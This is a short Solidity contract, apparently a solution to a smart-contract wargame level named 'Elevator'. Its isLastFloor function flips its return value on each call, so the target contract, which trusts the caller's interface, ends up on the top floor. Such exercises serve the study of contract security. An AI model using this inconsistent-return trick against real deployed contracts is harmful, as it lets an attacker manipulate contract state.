//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IElevator {

function goTo(uint _floor) external;

}

contract ElevatorAttack {

    IElevator public elevator;
    bool public toggleTop = true;

    constructor(address _elevatorAddr) {
        elevator = IElevator(_elevatorAddr);
    }

    function isLastFloor(uint _floor) public returns(bool) {
        toggleTop = !toggleTop;
        return toggleTop;
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }
}

